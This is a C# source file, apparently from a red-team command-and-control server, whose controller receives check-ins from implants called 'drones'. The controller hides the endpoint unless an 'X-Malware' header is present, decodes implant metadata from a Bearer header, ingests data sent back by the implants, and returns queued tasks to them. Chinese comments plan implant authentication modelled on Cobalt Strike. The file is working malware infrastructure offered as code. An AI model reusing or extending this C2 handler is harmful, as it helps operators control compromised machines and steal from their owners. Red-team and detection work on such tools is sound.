using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.SignalR;
using TeamServer.Hubs;
using TeamServer.Interfaces;
using TeamServer.Models;

namespace TeamServer.Handlers
{
    [Controller]
    public class DefaultHttpHandlerController : ControllerBase
    {
        private readonly ITaskService _tasks;
        private readonly IHubContext<MessageHub, IMessageHub> _hub;

        public DefaultHttpHandlerController(ITaskService taskService, IHubContext<MessageHub, IMessageHub> hub)
        {
            _tasks = taskService;
            _hub = hub;
        }

        public async Task<IActionResult> RouteDrone()
        {
            // FIXME: 修改流量标识
            // troll if X-Malware header isn't present
            if (!HttpContext.Request.Headers.TryGetValue("X-Malware", out _)) return NotFound();

            // TODO: 上线认证，通过多种方式实现
            //         1. 生成的每个 implant 中内置不同 key，key 保留在服务端一份，相同 key 不能上线 n 次，
            //            n 是可自定义的，避免使用相同 payload 疯狂上线进行重放攻击，即一个限制一个 payload 可重复使用的次数
            //         2. 验证上线 url，验证通信秘钥，算法参考 CobaltStrike

            // first, extract drone metadata
            var metadata = ExtractMetadata(HttpContext.Request.Headers);

            // if it's null, return a 404
            if (metadata is null) return NotFound();

            // if GET, just a checkin, it's not sending data
            // if POST, it's sending data, so read it
            if (HttpContext.Request.Method.Equals("POST", StringComparison.OrdinalIgnoreCase))
            {
                using var sr = new StreamReader(HttpContext.Request.Body);
                var body = await sr.ReadToEndAsync();
                await ExtractMessagesFromBody(body);
            }

            // get anything outbound
            var message = await _tasks.GetDroneTasks(metadata);

            if (message is null) return NoContent();
            await _hub.Clients.All.DroneDataSent(metadata, message.Data.Length);
            return Ok(message);
        }

        private static DroneMetadata ExtractMetadata(IHeaderDictionary headers)
        {
            if (!headers.TryGetValue("Authorization", out var encodedMetadata))
                return null;

            // remove "Bearer " from string
            encodedMetadata = encodedMetadata.ToString().Remove(0, 7);

            return Convert.FromBase64String(encodedMetadata)
                .Deserialize<DroneMetadata>();
        }

        private async Task ExtractMessagesFromBody(string body)
        {
            var messages = body.Deserialize<IEnumerable<C2Message>>();
            if (messages is null) return;

            await _tasks.RecvC2Data(messages);
        }
    }
}